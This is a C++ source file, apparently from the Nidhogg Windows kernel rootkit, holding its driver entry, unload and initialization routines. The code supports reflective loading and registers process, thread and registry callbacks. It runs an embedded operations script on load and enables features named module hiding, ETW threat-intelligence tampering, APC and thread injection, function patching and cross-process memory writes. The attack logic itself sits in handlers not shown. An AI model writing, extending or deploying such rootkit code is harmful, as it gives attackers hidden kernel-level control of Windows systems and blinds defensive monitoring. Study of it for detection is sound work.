#include "pch.h"
#include "Nidhogg.h"

extern "C"
NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
#ifdef DRIVER_REFLECTIVELY_LOADED
	UNREFERENCED_PARAMETER(DriverObject);
	UNREFERENCED_PARAMETER(RegistryPath);
	Features.DriverReflectivelyLoaded = true;
	Features.ProcessProtection = false;
	Features.ThreadProtection = false;
	Features.RegistryFeatures = false;
	Features.AutoModuleUnload = false;
	Print(DRIVER_PREFIX "Driver is being reflectively loaded...\n");

	UNICODE_STRING driverName = RTL_CONSTANT_STRING(DRIVER_NAME);
	UNICODE_STRING routineName = RTL_CONSTANT_STRING(L"IoCreateDriver");
	tIoCreateDriver IoCreateDriver = (tIoCreateDriver)MmGetSystemRoutineAddress(&routineName);

	if (!IoCreateDriver)
		return STATUS_INCOMPATIBLE_DRIVER_BLOCKED;

	NTSTATUS status = IoCreateDriver(&driverName, &NidhoggEntry);

	if (!NT_SUCCESS(status))
		Print(DRIVER_PREFIX "Failed to create driver: (0x%08X)\n", status);
	return status;
#endif

	return NidhoggEntry(DriverObject, RegistryPath);
}

/*
* Description:
* NidhoggEntry is responsible for handling the driver loading process.
*
* Parameters:
* @DriverObject [PDRIVER_OBJECT]  -- The driver object contains a lot of important driver configuration such as DeviceObject, MajorFunctions and more.
* @RegistryPath [PUNICODE_STRING] -- The driver's associated registry path, unused.
*
* Returns:
* @status		[NTSTATUS]		  -- Whether the driver is loaded successfuly or not.
*/
NTSTATUS NidhoggEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
	UNREFERENCED_PARAMETER(RegistryPath);
	NTSTATUS status = STATUS_SUCCESS;

	if (!InitializeFeatures()) {
		ClearAll();
		return STATUS_INCOMPATIBLE_DRIVER_BLOCKED;
	}

	// Setting up the device object.
	UNICODE_STRING deviceName = RTL_CONSTANT_STRING(DRIVER_DEVICE_NAME);
	UNICODE_STRING symbolicLink = RTL_CONSTANT_STRING(DRIVER_SYMBOLIC_LINK);
	UNICODE_STRING altitude = RTL_CONSTANT_STRING(OB_CALLBACKS_ALTITUDE);
	UNICODE_STRING regAltitude = RTL_CONSTANT_STRING(REG_CALLBACK_ALTITUDE);
	PDEVICE_OBJECT DeviceObject = nullptr;

	// Creating device and symbolic link.
	status = IoCreateDevice(DriverObject, 0, &deviceName, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &DeviceObject);

	if (!NT_SUCCESS(status)) {
		Print(DRIVER_PREFIX "Failed to create device: (0x%08X)\n", status);
		ClearAll();
		return status;
	}

	status = IoCreateSymbolicLink(&symbolicLink, &deviceName);

	if (!NT_SUCCESS(status)) {
		Print(DRIVER_PREFIX "Failed to create symbolic link: (0x%08X)\n", status);
		IoDeleteDevice(DeviceObject);
		ClearAll();
		return status;
	}

	// Registering the process callback function only if the driver isn't reflectively loaded (to avoid BSOD).
	if (!Features.DriverReflectivelyLoaded) {
		OB_OPERATION_REGISTRATION operations[] = {
		{
			PsProcessType,
			OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE,
			OnPreOpenProcess, nullptr
		},
		{
			PsThreadType,
			OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE,
			OnPreOpenThread, nullptr
		}
		};
		OB_CALLBACK_REGISTRATION registrationCallbacks = {
			OB_FLT_REGISTRATION_VERSION,
			REGISTERED_OB_CALLBACKS,
			RTL_CONSTANT_STRING(OB_CALLBACKS_ALTITUDE),
			nullptr,
			operations
		};

		status = ObRegisterCallbacks(&registrationCallbacks, &RegistrationHandle);

		if (!NT_SUCCESS(status)) {
			Print(DRIVER_PREFIX "Failed to register process callback: (0x%08X)\n", status);
			status = STATUS_SUCCESS;
			Features.ProcessProtection = false;
			Features.ThreadProtection = false;
		}

		status = CmRegisterCallbackEx(OnRegistryNotify, &regAltitude, DriverObject, nullptr, &NidhoggRegistryHandler->regCookie, nullptr);

		if (!NT_SUCCESS(status)) {
			Print(DRIVER_PREFIX "Failed to register registry callback: (0x%08X)\n", status);
			status = STATUS_SUCCESS;
			Features.RegistryFeatures = false;
		}

		status = PsSetCreateProcessNotifyRoutine(OnProcessCreationExit, FALSE);

		if (!NT_SUCCESS(status)) {
			Print(DRIVER_PREFIX "Failed to register process creation callback: (0x%08X)\n", status);
			status = STATUS_SUCCESS;
			Features.AutoModuleUnload = false;
		}
	}
	else {
		DeviceObject->Flags |= DO_BUFFERED_IO;
		DeviceObject->Flags &= ~DO_DEVICE_INITIALIZING;
	}

	// Setting up functions.
	DriverObject->DriverUnload = NidhoggUnload;
	DriverObject->MajorFunction[IRP_MJ_CREATE] = DriverObject->MajorFunction[IRP_MJ_CLOSE] = NidhoggCreateClose;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = NidhoggDeviceControl;

	ExecuteInitialOperations();

	Print(DRIVER_PREFIX "Initialization finished.\n");
	return status;
}

/*
* Description:
* NidhoggUnload is responsible for handling the driver unloading process which includes: Removing all hooks, deleting the symbolic link and the deviceobject.
*
* Parameters:
* @DriverObject [PDRIVER_OBJECT] -- The driver object contains a lot of important driver configuration such as DeviceObject, MajorFunctions and more.
*
* Returns:
* There is no return value.
*/
void NidhoggUnload(PDRIVER_OBJECT DriverObject) {
	Print(DRIVER_PREFIX "Unloading...\n");

	if (Features.RegistryFeatures) {
		NTSTATUS status = CmUnRegisterCallback(NidhoggRegistryHandler->regCookie);

		if (!NT_SUCCESS(status)) {
			Print(DRIVER_PREFIX "Failed to unregister registry callbacks: (0x%08X)\n", status);
		}
	}

	if (Features.AutoModuleUnload) {
		NTSTATUS status = PsSetCreateProcessNotifyRoutine(OnProcessCreationExit, TRUE);

		if (!NT_SUCCESS(status)) {
			Print(DRIVER_PREFIX "Failed to unregister process creation callback: (0x%08X)\n", status);
		}
	}

	if (Features.ThreadProtection && Features.ProcessProtection && RegistrationHandle) {
		ObUnRegisterCallbacks(RegistrationHandle);
		RegistrationHandle = NULL;
	}
	ClearAll();

	UNICODE_STRING symbolicLink = RTL_CONSTANT_STRING(DRIVER_SYMBOLIC_LINK);
	IoDeleteSymbolicLink(&symbolicLink);
	IoDeleteDevice(DriverObject->DeviceObject);
}

/*
* Description:
* ExecuteInitialOperations is responsible for executing initial opeartions script.
*
* Parameters:
* There are no parameters.
*
* Returns:
* There is no return value.
*/
void ExecuteInitialOperations() {
	ScriptManager* scriptManager = nullptr;
	ScriptInformation scriptInfo{};

	if constexpr (InitialOperationsSize == 0 || !InitialOperations)
		return;
#pragma warning(push)
#pragma warning(disable : 4702)
	scriptInfo.ScriptSize = InitialOperationsSize;
	MemoryAllocator<PVOID> script(scriptInfo.ScriptSize);
	NTSTATUS status = script.CopyData((PVOID)InitialOperations, scriptInfo.ScriptSize);

	if (!NT_SUCCESS(status))
		return;
	scriptInfo.Script = script.Get();

	__try {
		scriptManager = new ScriptManager();
		status = scriptManager->ExecuteScript((PUCHAR)scriptInfo.Script, scriptInfo.ScriptSize);
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		status = GetExceptionCode();
	}

	if (scriptManager) {
		delete scriptManager;
		scriptManager = nullptr;
	}

	if (!NT_SUCCESS(status))
		Print(DRIVER_PREFIX "Failed to execute initial operations (0x%08X)\n", status);
	else
		Print(DRIVER_PREFIX "Executed initial opeartions successfully.\n");
#pragma warning(pop)
}

/*
* Description:
* ClearAll is responsible for freeing all allocated memory and cleaning all the globals.
*
* Parameters:
* There are no parameters.
*
* Returns:
* There is no return value.
*/
void ClearAll() {
	// Clear the handlers in reverse order of initialization to avoid dependency issues
	if (NidhoggNetworkHandler) {
		delete NidhoggNetworkHandler;
		NidhoggNetworkHandler = nullptr;
	}
	if (NidhoggRegistryHandler) {
		delete NidhoggRegistryHandler;
		NidhoggRegistryHandler = nullptr;
	}
	if (NidhoggAntiAnalysisHandler) {
		delete NidhoggAntiAnalysisHandler;
		NidhoggAntiAnalysisHandler = nullptr;
	}
	if (NidhoggMemoryHandler) {
		delete NidhoggMemoryHandler;
		NidhoggMemoryHandler = nullptr;
	}
	if (NidhoggFileHandler) {
		delete NidhoggFileHandler;
		NidhoggFileHandler = nullptr;
	}
	if (NidhoggThreadHandler) {
		delete NidhoggThreadHandler;
		NidhoggThreadHandler = nullptr;
	}
	if (NidhoggProcessHandler) {
		delete NidhoggProcessHandler;
		NidhoggProcessHandler = nullptr;
	}
}

/*
* Description:
* InitializeFeatures is responsible for initializing the features and the globals.
*
* Parameters:
* There are no parameters.
*
* Returns:
* There is no return value.
*/
bool InitializeFeatures() {
	NidhoggProcessHandler = nullptr;
	NidhoggThreadHandler = nullptr;
	NidhoggFileHandler = nullptr;
	NidhoggMemoryHandler = nullptr;
	NidhoggAntiAnalysisHandler = nullptr;
	NidhoggRegistryHandler = nullptr;
	NidhoggNetworkHandler = nullptr;
	
	// Get windows version.
	RTL_OSVERSIONINFOW osVersion = { sizeof(osVersion) };
	NTSTATUS result = RtlGetVersion(&osVersion);

	if (!NT_SUCCESS(result))
		return false;

	WindowsBuildNumber = osVersion.dwBuildNumber;

	if (WindowsBuildNumber < WIN_1507)
		return false;

	UNICODE_STRING routineName = RTL_CONSTANT_STRING(L"ExAllocatePool2");
	AllocatePool2 = MmGetSystemRoutineAddress(&routineName);

	// Initialize utils.
	__try {
		NidhoggProcessHandler = new ProcessHandler();

		if (!NidhoggProcessHandler)
			return false;

		NidhoggThreadHandler = new ThreadHandler();

		if (!NidhoggThreadHandler)
			return false;

		NidhoggFileHandler = new FileHandler();

		if (!NidhoggFileHandler)
			return false;

		NidhoggMemoryHandler = new MemoryHandler();

		if (!NidhoggMemoryHandler)
			return false;

		NidhoggAntiAnalysisHandler = new AntiAnalysisHandler();

		if (!NidhoggAntiAnalysisHandler)
			return false;

		NidhoggRegistryHandler = new RegistryHandler();

		if (!NidhoggRegistryHandler)
			return false;

		NidhoggNetworkHandler = new NetworkHandler();

		if (!NidhoggNetworkHandler)
			return false;
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		ClearAll();
		return false;
	}

	// Initialize functions.
	if (!reinterpret_cast<PULONG>(MmCopyVirtualMemory))
		Features.ReadData = false;

	if (!reinterpret_cast<PULONG>(ZwProtectVirtualMemory) || !Features.ReadData)
		Features.WriteData = false;

	if (!Features.WriteData || !reinterpret_cast<PULONG>(PsGetProcessPeb))
		Features.FunctionPatching = false;

	if (!reinterpret_cast<PULONG>(PsGetProcessPeb) || !reinterpret_cast<PULONG>(PsLoadedModuleList) || 
		!&PsLoadedModuleResource)
		Features.ModuleHiding = false;

	if (!reinterpret_cast<PULONG>(ObReferenceObjectByName))
		Features.FileProtection = false;

	if (!reinterpret_cast<PULONG>(KeInsertQueueApc))
		Features.EtwTiTamper = false;

	if (!reinterpret_cast<PULONG>(KeInitializeApc) || !reinterpret_cast<PULONG>(KeInsertQueueApc) || 
		!reinterpret_cast<PULONG>(KeTestAlertThread) || !reinterpret_cast<PULONG>(ZwQuerySystemInformation))
		Features.ApcInjection = false;

	if (NidhoggMemoryHandler->FoundNtCreateThreadEx())
		Features.CreateThreadInjection = true;
	return true;
}
